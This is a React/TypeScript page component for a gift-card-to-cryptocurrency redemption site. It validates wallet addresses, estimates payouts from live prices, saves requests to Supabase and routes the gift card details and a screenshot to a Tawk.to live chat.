import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { toast } from "sonner";
import { Gift, Wallet, Mail, History, MessageCircle, Calculator, TrendingUp, TrendingDown, RefreshCw } from "lucide-react";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { supabase } from "@/integrations/supabase/client";
import { Link, useNavigate } from "react-router-dom";
import { useRealtimePrices } from "@/hooks/useRealtimePrices";
import { PriceSparkline } from "@/components/PriceSparkline";

// Exchange rates to USD (approximate)
const exchangeRatesToUSD: Record<string, number> = {
  usd: 1,
  eur: 1.10,
  gbp: 1.27,
  cad: 0.74,
  aud: 0.65,
  jpy: 0.0067,
};

// Declare Tawk_API for TypeScript
declare global {
  interface Window {
    Tawk_API?: {
      maximize?: () => void;
      addEvent?: (eventName: string, metadata: Record<string, string>, callback?: () => void) => void;
      setAttributes?: (attributes: Record<string, string>, callback?: (error?: Error) => void) => void;
      onLoad?: () => void;
    };
  }
}

const cryptoNames: Record<string, string> = {
  btc: "Bitcoin (BTC)",
  eth: "Ethereum (ETH)",
  usdt: "Tether (USDT)",
  bnb: "Binance Coin (BNB)",
};

// Wallet address validation patterns
const walletValidators: Record<string, { pattern: RegExp; example: string; description: string }> = {
  btc: {
    pattern: /^(1|3)[a-zA-HJ-NP-Z0-9]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$/,
    example: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    description: "Bitcoin address (starts with 1, 3, or bc1)"
  },
  eth: {
    pattern: /^0x[a-fA-F0-9]{40}$/,
    example: "0x742d35Cc6634C0532925a3b844Bc9e7595f...",
    description: "Ethereum address (starts with 0x, 42 characters)"
  },
  usdt: {
    pattern: /^0x[a-fA-F0-9]{40}$|^T[a-zA-HJ-NP-Z0-9]{33}$/,
    example: "0x... (ERC-20) or T... (TRC-20)",
    description: "USDT address (ERC-20 or TRC-20 format)"
  },
  bnb: {
    pattern: /^0x[a-fA-F0-9]{40}$|^bnb[a-zA-Z0-9]{39}$/,
    example: "0x... (BEP-20) or bnb... (BEP-2)",
    description: "BNB address (BEP-20 or BEP-2 format)"
  }
};

const giftCardTypes: Record<string, string> = {
  amazon: "Amazon",
  itunes: "iTunes / Apple",
  googleplay: "Google Play",
  steam: "Steam",
  ebay: "eBay",
  walmart: "Walmart",
  target: "Target",
  visa: "Visa Prepaid",
  mastercard: "Mastercard Prepaid",
  amex: "American Express",
  netflix: "Netflix",
  spotify: "Spotify",
  playstation: "PlayStation",
  xbox: "Xbox",
  razer: "Razer Gold",
  other: "Other",
};

const currencies: Record<string, { name: string; symbol: string }> = {
  usd: { name: "USD - US Dollar", symbol: "$" },
  eur: { name: "EUR - Euro", symbol: "€" },
  gbp: { name: "GBP - British Pound", symbol: "£" },
  cad: { name: "CAD - Canadian Dollar", symbol: "$" },
  aud: { name: "AUD - Australian Dollar", symbol: "$" },
  jpy: { name: "JPY - Japanese Yen", symbol: "¥" },
};

const Redeem = () => {
  const [giftCardCode, setGiftCardCode] = useState("");
  const [giftCardType, setGiftCardType] = useState("");
  const [amount, setAmount] = useState("");
  const [currency, setCurrency] = useState("usd");
  const [email, setEmail] = useState("");
  const [walletAddress, setWalletAddress] = useState("");
  const [selectedCrypto, setSelectedCrypto] = useState("");
  const [loading, setLoading] = useState(false);
  const [walletError, setWalletError] = useState<string | null>(null);
  const [emailError, setEmailError] = useState<string | null>(null);
  const [amountError, setAmountError] = useState<string | null>(null);
  const [user, setUser] = useState<any>(null);
  const navigate = useNavigate();
  
  // Use realtime prices hook for live updates
  const { prices, priceChanges, loading: pricesLoading } = useRealtimePrices();
  
  // Convert prices array to lookup object
  const cryptoPrices = prices.reduce((acc, coin) => {
    acc[coin.symbol.toUpperCase()] = coin.price;
    return acc;
  }, {} as Record<string, number>);

  // Calculate estimated crypto amount
  const calculateEstimatedCrypto = () => {
    if (!amount || !selectedCrypto) return null;
    
    const cryptoSymbol = selectedCrypto.toUpperCase();
    const coinData = prices.find(p => p.symbol.toUpperCase() === cryptoSymbol);
    
    if (!coinData) return null;
    
    const giftCardValue = parseFloat(amount);
    if (isNaN(giftCardValue) || giftCardValue <= 0) return null;
    
    const usdValue = giftCardValue * (exchangeRatesToUSD[currency] || 1);
    const estimatedCrypto = usdValue / coinData.price;
    
    return {
      usdValue,
      cryptoAmount: estimatedCrypto,
      cryptoPrice: coinData.price,
      cryptoSymbol,
      change24h: coinData.change_24h
    };
  };

  const estimate = calculateEstimatedCrypto();

  useEffect(() => {
    const checkAuth = async () => {
      const { data: { user } } = await supabase.auth.getUser();
      setUser(user);
    };
    checkAuth();
  }, []);

  const validateAmount = (value: string): boolean => {
    if (!value) {
      setAmountError(null);
      return true;
    }
    const numValue = parseFloat(value);
    if (isNaN(numValue) || numValue <= 0) {
      setAmountError("Please enter a valid positive amount");
      return false;
    }
    setAmountError(null);
    return true;
  };

  useEffect(() => {
    const checkAuth = async () => {
      const { data: { user } } = await supabase.auth.getUser();
      setUser(user);
    };
    checkAuth();
  }, []);

  const validateEmail = (email: string): boolean => {
    if (!email) {
      setEmailError(null);
      return true;
    }
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email.trim())) {
      setEmailError("Please enter a valid email address");
      return false;
    }
    setEmailError(null);
    return true;
  };

  const validateWalletAddress = (address: string, crypto: string): boolean => {
    if (!crypto || !address) {
      setWalletError(null);
      return true;
    }

    const validator = walletValidators[crypto];
    if (!validator) {
      setWalletError(null);
      return true;
    }

    const trimmedAddress = address.trim();
    if (!validator.pattern.test(trimmedAddress)) {
      setWalletError(`Invalid ${cryptoNames[crypto]} address. ${validator.description}`);
      return false;
    }

    setWalletError(null);
    return true;
  };

  const handleWalletChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const address = e.target.value;
    setWalletAddress(address);
    if (selectedCrypto && address) {
      validateWalletAddress(address, selectedCrypto);
    } else {
      setWalletError(null);
    }
  };

  const handleCryptoChange = (crypto: string) => {
    setSelectedCrypto(crypto);
    if (walletAddress) {
      validateWalletAddress(walletAddress, crypto);
    }
  };


  const handleRedeem = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!giftCardCode || !giftCardType || !amount || !email || !walletAddress || !selectedCrypto) {
      toast.error("Please fill in all fields");
      return;
    }

    // Validate amount
    if (!validateAmount(amount)) {
      toast.error("Please enter a valid gift card amount");
      return;
    }

    // Validate email format
    if (!validateEmail(email)) {
      toast.error("Please enter a valid email address");
      return;
    }

    // Validate wallet address format
    if (!validateWalletAddress(walletAddress, selectedCrypto)) {
      toast.error("Please enter a valid wallet address for the selected cryptocurrency");
      return;
    }

    // Validate wallet address format
    if (!validateWalletAddress(walletAddress, selectedCrypto)) {
      toast.error("Please enter a valid wallet address for the selected cryptocurrency");
      return;
    }

    setLoading(true);

    // Save redemption to database if user is logged in
    if (user) {
      const { error: dbError } = await supabase
        .from("redemptions")
        .insert({
          user_id: user.id,
          gift_card_code: giftCardCode,
          gift_card_type: giftCardType,
          amount: parseFloat(amount),
          gift_card_currency: currency.toUpperCase(),
          crypto_symbol: selectedCrypto,
          wallet_address: walletAddress,
          email: email,
          status: "pending"
        });

      if (dbError) {
        console.error("Error saving redemption:", dbError);
        // Continue anyway - still send to Tawk.to
      }
    }
    
    // Prepare redemption message for Tawk.to
    const redemptionMessage = `🎁 NEW GIFT CARD REDEMPTION REQUEST

Gift Card Type: ${giftCardTypes[giftCardType] || giftCardType}
Gift Card Code: ${giftCardCode}
Gift Card Amount: ${currencies[currency]?.symbol || ""}${amount} ${currency.toUpperCase()}
Email: ${email}
Cryptocurrency: ${cryptoNames[selectedCrypto] || selectedCrypto}
Wallet Address: ${walletAddress}

Please process this redemption request.`;

    // Send to Tawk.to live chat
    if (window.Tawk_API) {
      // Add event for tracking
      if (window.Tawk_API.addEvent) {
        window.Tawk_API.addEvent('gift_card_redemption', {
          giftCardType: giftCardType,
          giftCardCode: giftCardCode,
          amount: `${currencies[currency]?.symbol || ""}${amount} ${currency.toUpperCase()}`,
          email: email,
          crypto: selectedCrypto,
          walletAddress: walletAddress
        });
      }

      // Set visitor attributes
      if (window.Tawk_API.setAttributes) {
        window.Tawk_API.setAttributes({
          'redemption_request': 'true',
          'crypto_type': selectedCrypto
        });
      }

      // Open chat widget and send message
      if (window.Tawk_API.maximize) {
        window.Tawk_API.maximize();
      }

      // Use a small delay to ensure chat is open before showing success
      setTimeout(() => {
        toast.success("Please upload your gift card screenshot in the chat window for verification.");
        setGiftCardCode("");
        setGiftCardType("");
        setAmount("");
        setCurrency("usd");
        setEmail("");
        setWalletAddress("");
        setSelectedCrypto("");
        setLoading(false);
      }, 1000);

      // Copy message to clipboard so user can paste it in chat
      navigator.clipboard.writeText(redemptionMessage).then(() => {
        toast.info("Redemption details copied to clipboard. Please paste in the chat.");
      });
    } else {
      toast.error("Chat support is not available. Please try again later.");
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-background p-4">
      <div className="container mx-auto max-w-2xl py-12">
        <div className="mb-8 text-center">
          <div className="mb-4 inline-flex rounded-full bg-primary/10 p-4">
            <Gift className="h-12 w-12 text-primary" />
          </div>
          <h1 className="mb-2 text-4xl font-bold">Redeem Gift Card</h1>
          <p className="text-muted-foreground">Convert your gift cards to crypto instantly</p>
          {user && (
            <Link to="/redemption-history">
              <Button variant="outline" className="mt-4">
                <History className="mr-2 h-4 w-4" />
                View Redemption History
              </Button>
            </Link>
          )}
        </div>

        <Card className="border-border bg-card p-6">
          <form onSubmit={handleRedeem} className="space-y-6">
            <div className="space-y-2">
              <Label htmlFor="giftcardtype">Gift Card Type</Label>
              <Select value={giftCardType} onValueChange={setGiftCardType}>
                <SelectTrigger id="giftcardtype" className="bg-background">
                  <SelectValue placeholder="Select gift card type" />
                </SelectTrigger>
                <SelectContent className="bg-popover">
                  {Object.entries(giftCardTypes).map(([key, name]) => (
                    <SelectItem key={key} value={key}>{name}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2">
              <Label htmlFor="giftcard">Gift Card Code</Label>
              <Input
                id="giftcard"
                placeholder="Enter your gift card code"
                value={giftCardCode}
                onChange={(e) => setGiftCardCode(e.target.value)}
                className="bg-background"
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="amount">Gift Card Amount</Label>
              <div className="flex gap-2">
                <Select value={currency} onValueChange={setCurrency}>
                  <SelectTrigger className="w-[140px] bg-background">
                    <SelectValue placeholder="Currency" />
                  </SelectTrigger>
                  <SelectContent className="bg-popover">
                    {Object.entries(currencies).map(([key, { name }]) => (
                      <SelectItem key={key} value={key}>{key.toUpperCase()}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                <div className="relative flex-1">
                  <span className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground">
                    {currencies[currency]?.symbol || "$"}
                  </span>
                  <Input
                    id="amount"
                    type="number"
                    placeholder="0.00"
                    value={amount}
                    onChange={(e) => {
                      setAmount(e.target.value);
                      if (e.target.value) validateAmount(e.target.value);
                    }}
                    className={`bg-background pl-7 ${amountError ? 'border-destructive' : ''}`}
                    min="0"
                    step="0.01"
                  />
                </div>
              </div>
              {amountError && (
                <p className="text-sm text-destructive">{amountError}</p>
              )}
            </div>

            <div className="space-y-2">
              <Label htmlFor="email">Email Address</Label>
              <div className="relative">
                <Mail className="absolute left-3 top-3 h-4 w-4 text-muted-foreground" />
                <Input
                  id="email"
                  type="email"
                  placeholder="Enter your email for confirmation"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    if (e.target.value) validateEmail(e.target.value);
                  }}
                  className={`bg-background pl-10 ${emailError ? 'border-destructive' : ''}`}
                />
              </div>
              {emailError && (
                <p className="text-sm text-destructive">{emailError}</p>
              )}
              <p className="text-xs text-muted-foreground">
                You'll receive a confirmation when your redemption is processed
              </p>
            </div>

            <div className="space-y-2">
              <Label htmlFor="crypto">Select Cryptocurrency</Label>
              <Select value={selectedCrypto} onValueChange={handleCryptoChange}>
                <SelectTrigger id="crypto" className="bg-background">
                  <SelectValue placeholder="Choose a cryptocurrency" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="btc">Bitcoin (BTC)</SelectItem>
                  <SelectItem value="eth">Ethereum (ETH)</SelectItem>
                  <SelectItem value="usdt">Tether (USDT)</SelectItem>
                  <SelectItem value="bnb">Binance Coin (BNB)</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2">
              <Label htmlFor="wallet">Wallet Address</Label>
              <div className="relative">
                <Wallet className="absolute left-3 top-3 h-4 w-4 text-muted-foreground" />
                <Input
                  id="wallet"
                  placeholder={selectedCrypto ? `Enter your ${cryptoNames[selectedCrypto]} wallet address` : "Enter your crypto wallet address"}
                  value={walletAddress}
                  onChange={handleWalletChange}
                  className={`bg-background pl-10 ${walletError ? 'border-destructive' : ''}`}
                />
              </div>
              {walletError && (
                <p className="text-sm text-destructive">{walletError}</p>
              )}
              {selectedCrypto && !walletError && walletValidators[selectedCrypto] && (
                <p className="text-xs text-muted-foreground">
                  Example: {walletValidators[selectedCrypto].example}
                </p>
              )}
            </div>

            {/* Redemption Value Calculator */}
            {estimate && (
              <Card id="calculator" className="border-primary/30 bg-gradient-to-br from-primary/10 to-primary/5 p-4">
                <div className="flex items-center justify-between mb-3">
                  <div className="flex items-center gap-2">
                    <Calculator className="h-5 w-5 text-primary" />
                    <h3 className="font-semibold text-foreground">Estimated Redemption Value</h3>
                  </div>
                  <div className="flex items-center gap-1 text-xs text-muted-foreground">
                    <RefreshCw className={`h-3 w-3 ${priceChanges.has(selectedCrypto.toUpperCase()) ? 'animate-spin' : ''}`} />
                    <span>Live prices</span>
                  </div>
                </div>
                
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between text-muted-foreground">
                    <span>Gift Card Value:</span>
                    <span>{currencies[currency]?.symbol}{amount} {currency.toUpperCase()}</span>
                  </div>
                  
                  {currency !== 'usd' && (
                    <div className="flex justify-between text-muted-foreground">
                      <span>USD Equivalent:</span>
                      <span>${estimate.usdValue.toFixed(2)}</span>
                    </div>
                  )}
                  
                  <div className={`flex justify-between items-center text-muted-foreground transition-colors duration-300 ${
                    priceChanges.get(selectedCrypto.toUpperCase())?.direction === 'up' ? 'text-green-500' :
                    priceChanges.get(selectedCrypto.toUpperCase())?.direction === 'down' ? 'text-red-500' : ''
                  }`}>
                    <span>Current {estimate.cryptoSymbol} Price:</span>
                    <div className="flex items-center gap-2">
                      <span>${estimate.cryptoPrice.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
                      <span className={`text-xs flex items-center gap-0.5 ${estimate.change24h >= 0 ? 'text-green-500' : 'text-red-500'}`}>
                        {estimate.change24h >= 0 ? <TrendingUp className="h-3 w-3" /> : <TrendingDown className="h-3 w-3" />}
                        {Math.abs(estimate.change24h).toFixed(2)}%
                      </span>
                    </div>
                  </div>
                  
                  {/* Price Sparkline */}
                  <div className="py-2 px-1 bg-background/50 rounded-md">
                    <PriceSparkline 
                      currentPrice={estimate.cryptoPrice} 
                      change24h={estimate.change24h} 
                      symbol={estimate.cryptoSymbol} 
                    />
                    <p className="text-[10px] text-center text-muted-foreground mt-1">24h price trend</p>
                  </div>
                  
                  <div className={`mt-3 p-3 rounded-lg bg-primary/20 border border-primary/30 transition-all duration-300 ${
                    priceChanges.has(selectedCrypto.toUpperCase()) ? 'ring-2 ring-primary/50' : ''
                  }`}>
                    <div className="flex items-center justify-between">
                      <span className="text-muted-foreground">You'll receive approximately:</span>
                      <div className="flex items-center gap-1">
                        <TrendingUp className="h-4 w-4 text-primary" />
                        <span className="text-lg font-bold text-primary">
                          {estimate.cryptoAmount < 0.0001 
                            ? estimate.cryptoAmount.toExponential(4)
                            : estimate.cryptoAmount.toFixed(8)} {estimate.cryptoSymbol}
                        </span>
                      </div>
                    </div>
                  </div>
                  
                  <p className="text-xs text-muted-foreground mt-2">
                    ⚠️ This is an estimate only. Final amount may vary based on verification and processing fees.
                  </p>
                </div>
              </Card>
            )}

            <Alert className="border-primary/20 bg-primary/5">
              <MessageCircle className="h-4 w-4 text-primary" />
              <AlertDescription className="text-sm">
                <strong>Important:</strong> After clicking "Redeem Gift Card", a live chat will open. 
                Please <span className="font-semibold text-primary">upload your gift card screenshot directly in the chat</span> for faster verification.
              </AlertDescription>
            </Alert>

            <Button 
              type="submit" 
              className="w-full bg-primary text-primary-foreground hover:bg-primary/90"
              disabled={loading}
            >
              {loading ? "Processing..." : "Redeem Gift Card"}
            </Button>
          </form>
        </Card>

        <Card className="mt-6 border-border bg-card/50 p-4">
          <h3 className="mb-2 font-semibold">How it works:</h3>
          <ol className="list-decimal space-y-1 pl-5 text-sm text-muted-foreground">
            <li>Enter your gift card details and select cryptocurrency</li>
            <li>Provide your wallet address</li>
            <li>Click "Redeem Gift Card" to open the live chat</li>
            <li>Upload your gift card screenshot in the chat window</li>
            <li>Our team will verify and process your redemption</li>
          </ol>
        </Card>
      </div>
    </div>
  );
};

export default Redeem;
